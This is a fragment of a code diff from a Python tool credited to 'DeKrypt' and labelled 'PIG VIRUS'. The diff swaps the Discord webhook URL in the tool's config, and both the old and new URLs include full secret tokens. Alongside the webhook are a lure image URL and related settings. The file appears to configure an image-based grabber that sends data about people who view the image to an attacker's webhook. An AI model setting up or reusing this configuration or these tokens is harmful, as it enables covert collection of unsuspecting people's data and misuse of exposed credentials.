@@ -13,7 +13,7 @@ __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1359158831850193046/G41Ou1GBQ1eO1nzKeFGX71ZNXtcCu4TpKeU0rDF8wsWT_5Avi88cCInino_ryo97jOyv",
+    "webhook": "https://discord.com/api/webhooks/1359382890751725588/c-jxRmgOQPZN4_QvA8J5jhDnubu80Gixs6eDEuDA18X2638IpxRgWb-pS6vX9vlE_iMB",
     "image": "https://kovar.vn/wp-content/uploads/2020/08/bmw-i8.jpg",
     "imageArgument": True,
     "username": "PIG VIRUS",
